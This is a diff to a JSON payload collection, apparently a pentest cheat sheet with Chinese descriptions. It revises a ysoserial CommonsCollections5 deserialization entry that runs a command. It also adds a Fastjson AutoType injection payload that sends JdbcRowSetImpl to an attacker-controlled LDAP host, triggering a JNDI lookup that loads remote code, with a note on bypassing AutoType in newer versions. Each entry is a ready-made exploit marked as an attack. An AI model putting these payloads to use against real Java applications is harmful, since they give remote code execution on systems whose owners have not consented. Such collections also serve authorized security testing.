@@ -20,7 +20,7 @@
       "title": "CommonsCollections 链",
       "category": "Java 系",
       "code": "java -jar ysoserial.jar CommonsCollections5 \"id\" > payload.bin",
-      "desc": "依赖 commons-collections 3.1，需根据目标 classpath 选择对应链。",
+      "desc": "依赖 commons-collections 3.1。CC1/CC5/CC6 的入口与 JDK 限制不同，需按目标环境逐个尝试。",
       "tags": ["deserialization", "java", "commonscollections"],
       "vars": [],
       "risk": "attack",
@@ -36,6 +36,17 @@
       "vars": [],
       "risk": "attack",
       "source": "ysoserial 官方仓库"
+    },
+    {
+      "id": "deser-fastjson-autotype",
+      "title": "Fastjson AutoType 注入",
+      "category": "Java 系",
+      "code": "{\"@type\":\"com.sun.rowset.JdbcRowSetImpl\",\"dataSourceName\":\"ldap://{{domain}}/exploit\",\"autoCommit\":true}",
+      "desc": "Fastjson 1.2.x 在 AutoType 开启时会实例化 @type 指定的类，JdbcRowSetImpl 在 setAutoCommit 时按 dataSourceName 发起 JNDI 查询，属于经典利用链；高版本需配合 AutoType 绕过。",
+      "tags": ["deserialization", "java", "fastjson", "jndi"],
+      "vars": ["domain"],
+      "risk": "attack",
+      "source": "公开 Fastjson 漏洞分析"
     },
     {
       "id": "deser-java-base64",
